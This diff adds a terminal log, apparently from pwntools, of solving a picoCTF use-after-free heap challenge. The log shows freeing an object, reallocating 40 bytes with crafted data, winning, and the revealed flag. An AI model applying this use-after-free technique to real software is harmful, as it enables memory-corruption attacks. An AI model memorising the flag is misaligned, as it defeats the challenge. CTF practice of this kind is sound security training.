@@ -1,0 +1,52 @@
+[+] Starting local process '/usr/bin/gdbserver': pid 97108
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './chall', '-x', '/tmp/pwndsm_5vde.gdb']
+[*] Switching to interactive mode
+
+freed but still in use
+now memory untracked
+do you smell the bug?
+
+1. Print Heap
+2. Allocate object
+3. Print x->flag
+4. Check for win
+5. Free x
+6. Exit
+
+Enter your choice: $ 5
+
+1. Print Heap
+2. Allocate object
+3. Print x->flag
+4. Check for win
+5. Free x
+6. Exit
+
+Enter your choice: $ 2
+Size of object allocation: $ 40
+Data for flag: $ abcdefghijklmnopqrstuvwxyzABCDpico
+
+1. Print Heap
+2. Allocate object
+3. Print x->flag
+4. Check for win
+5. Free x
+6. Exit
+
+Enter your choice: $ 1
+[*]   Address   ->   Value   
++-------------+-----------+
+[*]   0x18cf6ce  ->   pico
++-------------+-----------+
+
+1. Print Heap
+2. Allocate object
+3. Print x->flag
+4. Check for win
+5. Free x
+6. Exit
+
+Enter your choice: $ 4
+YOU WIN!!11!!
+picoCTF{now_thats_free_real_estate_79173b73}
+
